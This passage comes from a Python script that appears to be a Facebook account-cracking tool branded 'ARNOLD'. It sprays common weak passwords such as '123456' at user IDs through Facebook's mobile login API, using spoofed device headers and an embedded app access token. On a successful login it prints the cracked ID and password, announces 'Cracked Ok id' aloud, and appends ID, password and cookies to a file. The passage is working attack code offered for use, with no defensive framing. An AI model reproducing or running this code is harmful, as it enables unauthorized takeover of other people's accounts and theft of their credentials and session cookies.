                    print(f"Lỗi khi ghi file: {e}")
                except Exception as e:
                    print(f"Đã xảy ra lỗi: {e}")

                oks.append(uid)
                break

            # ✅ Alternative success case
            elif 'www.facebook.com' in res.get('error', {}).get('message', ''):
                cookies = "N/A"  # No cookies in this case
                print(
                    f"\r\r\x1b[1;37m[ARNOLD-OK]"
                    f"\x1b[1;97m•\x1b[38;5;46m{uid}"
                    f"\x1b[1;97m|\x1b[38;5;46m{pw}"
                    f"\x1b[1;97m|\x1b[38;5;46m{cookies}"
                    f"\x1b[1;97m|\x1b[38;5;15m{creationyear(uid)}"
                )
                os.system('espeak -a 300 " Cracked Ok id,"')
                with open('/sdcard/ARNOLD-OLD-OK.txt', 'a') as f:
                    f.write(f"{uid}|{pw}|{cookies}\n")
                oks.append(uid)
                break
        loop += 1
    except:
        time.sleep(5)


def login_2(uid):
    """
    Login attempt method 2.
    """
    sys.stdout.write(f"\r\r\x1b[38;5;195m[\x1b[1;37mARNOLD-XD\x1b[38;5;195m]|\x1b[38;5;195m[\x1b[38;5;192m{loop}\x1b[38;5;195m]| \x1b[38;5;195m[\x1b[1;37mOK\x1b[38;5;195m]| \x1b[38;5;195m[\x1b[38;5;192m{len(oks)}")
    
    for pw in ('123456', '123123', '1234567', '12345678', '123456789'):
        try:
            with requests.Session() as session:
                headers = {
                    'x-fb-connection-bandwidth': str(rr(20000000, 29999999)),
                    'x-fb-sim-hni': str(rr(20000, 40000)),
                    'x-fb-net-hni': str(rr(20000, 40000)),
                    'x-fb-connection-quality': 'EXCELLENT',
                    'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA',
                    'user-agent': arnold_all(),
                    'content-type': 'application/x-www-form-urlencoded',
                    'x-fb-http-engine': 'Liger'
                }
                url = f"https://b-api.facebook.com/method/auth.login?format=json&email={str(uid)}&password={str(pw)}&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20¤tly_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true"
                po = session.get(url, headers=headers).json()
                if 'session_key' in str(po):
                    print(f"\r\r\x1b[38;5;196m[\x1b[1;37mARNOLD-OK]\x1b[1;97m•\x1b[38;5;46m{uid}|\x1b[1;97m| \x1b[38;5;46m{pw}|\x1b[1;97m| \x1b[38;5;15m{creationyear(uid)}");os.system('espeak -a 300 " Cracked Ok id,"')
                    open('/sdcard/ARNOLD-OLD-OK.txt', 'a').write(f"{uid}|{pw}\n")
                    oks.append(uid)
                    break
                elif 'session_key' in po:
                    print(f"\r\r\x1b[38;5;196m[\x1b[1;37mARNOLD-OK]\x1b[1;97m•\x1b[38;5;46m{uid}|\x1b[1;97m| \x1b[38;5;46m{pw}|\x1b[1;97m| \x1b[38;5;15m{creationyear(uid)}");os.system('espeak -a 300 " Cracked Ok id,"')
                    open('/sdcard/ARNOLD-OLD-OK.txt', 'a').write(f"{uid}|{pw}\n")
                    oks.append(uid)
                    break
        except Exception as e:
            pass
    loop += 1

if __name__ == '__main__':
    BNG_71_()
